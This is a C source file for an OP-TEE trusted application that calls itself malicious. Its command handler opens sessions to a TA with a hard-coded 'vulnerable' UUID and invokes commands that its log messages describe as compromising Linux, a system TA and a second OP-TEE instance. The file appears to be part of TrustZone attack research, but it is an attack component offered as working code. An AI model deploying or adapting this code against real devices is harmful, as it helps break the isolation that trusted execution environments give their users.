#include <tee_internal_api.h>
#include <tee_api.h>
#include <tee_internal_api_extensions.h>
#include <malicious_ta.h>
#include <string.h>


#define VULNERABLE_UUID \
		{ 0x7f33e9e8, 0x124f, 0x4e04, \
			{ 0x8e, 0x4d, 0x54, 0x4a, 0xd2, 0x87, 0x66, 0xe8 } }

TEE_Result compromise_linux(uint32_t param_types, TEE_Param params[4])
{
    TEE_UUID uuid = VULNERABLE_UUID;
    TEE_Result res = TEE_SUCCESS;
    TEE_TASessionHandle sess = TEE_HANDLE_NULL;
    uint32_t ret_orig = 0;

    res = TEE_OpenTASession(&uuid, TEE_TIMEOUT_INFINITE, 0, NULL,
            &sess, &ret_orig);
    if(res != TEE_SUCCESS){
        EMSG("Failed to start compromise OPTEE");
    }


    IMSG("Compromising OP-TEE to compromise linux");
    res = TEE_InvokeTACommand(sess,
			       TEE_TIMEOUT_INFINITE, 1, param_types, params, &ret_orig);
    if(res != TEE_SUCCESS){
        EMSG("Failed to compromise");
    }
    TEE_CloseTASession(sess);
    return TEE_SUCCESS;
}

TEE_Result compromise_system_ta(uint32_t param_types, TEE_Param params[4])
{
    TEE_UUID uuid = VULNERABLE_UUID;
    TEE_Result res = TEE_SUCCESS;
    TEE_TASessionHandle sess = TEE_HANDLE_NULL;
    uint32_t ret_orig = 0;

    res = TEE_OpenTASession(&uuid, TEE_TIMEOUT_INFINITE, 0, NULL,
            &sess, &ret_orig);

    DMSG("Compromising OP-TEE to compromise system TA");
    res = TEE_InvokeTACommand(sess,
			       TEE_TIMEOUT_INFINITE, 2, 0, NULL, &ret_orig);

    TEE_CloseTASession(sess);
    return TEE_SUCCESS;
}

TEE_Result compromise_other_tee(uint32_t param_types, TEE_Param params[4])
{
    TEE_UUID uuid = VULNERABLE_UUID;
    TEE_Result res = TEE_SUCCESS;
    TEE_TASessionHandle sess = TEE_HANDLE_NULL;
    uint32_t ret_orig = 0;

    res = TEE_OpenTASession(&uuid, TEE_TIMEOUT_INFINITE, 0, NULL,
            &sess, &ret_orig);

    DMSG("Compromising OP-TEE to compromise second OP-TEE");
    res = TEE_InvokeTACommand(sess,
			       TEE_TIMEOUT_INFINITE, 3, 0, NULL, &ret_orig);

    TEE_CloseTASession(sess);
    return TEE_SUCCESS;
}

TEE_Result TA_CreateEntryPoint(void){
	/* DMSG("has been called"); */
	return TEE_SUCCESS;
}

void TA_DestroyEntryPoint(void){
	/* DMSG("has been called"); */
}

TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types, TEE_Param __maybe_unused params[4], void __maybe_unused **sess_ctx){

	uint32_t exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_NONE, 
							TEE_PARAM_TYPE_NONE, 
							TEE_PARAM_TYPE_NONE, 
							TEE_PARAM_TYPE_NONE);
	/* DMSG("has been called"); */
	if (param_types != exp_param_types)
		return TEE_ERROR_BAD_PARAMETERS;
	(void)&params;
	(void)&sess_ctx;
	/* IMSG("Hello from  malicious TA!\n"); */
	return TEE_SUCCESS;
}

void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx){
	(void)&sess_ctx;
	/* IMSG("Goodbye!\n"); */
}

TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx, uint32_t cmd_id, uint32_t param_types, TEE_Param params[4]){

	(void)&sess_ctx;
	
	switch (cmd_id) {
		case TA_MALICIOUS_CMD_1:
			return compromise_linux(param_types, params);
		case TA_MALICIOUS_CMD_2:
			return compromise_system_ta(param_types, params);
                case TA_MALICIOUS_CMD_3:
			return compromise_other_tee(param_types, params);
		default:
                        IMSG("unknown command: %d\n",cmd_id);
			return TEE_ERROR_BAD_PARAMETERS;
	}
}

